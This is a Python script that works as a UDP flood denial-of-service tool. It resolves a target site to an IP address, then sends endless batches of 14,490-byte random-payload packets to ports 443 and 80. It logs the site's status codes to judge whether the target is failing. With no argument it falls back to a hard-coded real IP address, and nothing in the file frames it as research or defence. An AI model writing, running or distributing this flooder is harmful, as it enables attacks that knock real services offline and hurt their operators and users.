import logging
import time
import socket
import random
import sys
from main import logger
import requests

##############


def pars_url(url: str) -> str:
    """
    for parst pars_url. Example 'https://google.com' -> "google.com"
    :param url: "https://google.com"
    :return: "google.com"
    """

    url = url.strip()
    replace_tuple = ("http://", "https://", ",", '"', "'", "\n", "\t")
    for i in replace_tuple:
        url = url.replace(i, '')

    return url[:-1] if url[-1] == "/" else url


def get_ip_from_url(url: str, origin_url: str) -> str:
    """
    "google.com" -> '142.251.39.46'
    :param url: "google.com"
    :param origin_url: "https://google.com"
    :return: "142.251.39.46"
    """
    site_ip = False
    try:
        site_ip = socket.gethostbyname(url)
    except socket.gaierror:
        logger.error(f'This site may be not valid "{origin_url}"')
    return site_ip


def sending_bytes(ip: str, url: str):
    """

    :return:
    """
    with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as sock:
    # sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        bytes = random._urandom(14490)
        status_site_1, status_site_2 = 0, 0
        port_1 = 443
        port_2 = 80
        sent = 1000
        while True:
            try:
                pass
                # status_site_1 = requests.get(url, timeout=2).status_code
            except:
                logger.error(f"Was exception with  {url}")

            logger.info(f"Status code of site {url} is {status_site_1}")

            for i in range(sent):
                sock.sendto(bytes, (ip, port_1))
                sock.sendto(bytes, (ip, port_2))
                # time.sleep(0.01)
            logger.info(f"Sent {sent} packet to {ip} throught port:{port_1}")
            logger.info(f"Sent {sent} packet to {ip} throught port:{port_2}")
            try:
                pass
                # status_site_2 = requests.get(url).status_code
            except:
                logger.error(f"Was exception with  {url}")

            if 500 <= status_site_2 <= 600:
                logger.debug(f'Site {url} is may fail with status {status_site_2}')


if __name__ == "__main__":
    logger.info('START PROGRAMMING')
    sys.argv.pop(0)
    if (url := sys.argv):
        url = url[0]
        site_ip = url
    else:
        site_ip = "185.114.138.220"
        url = "185.114.138.220"
    # site = pars_url(url)
    # site_ip = get_ip_from_url(site, url)
    sending_bytes(site_ip, url)
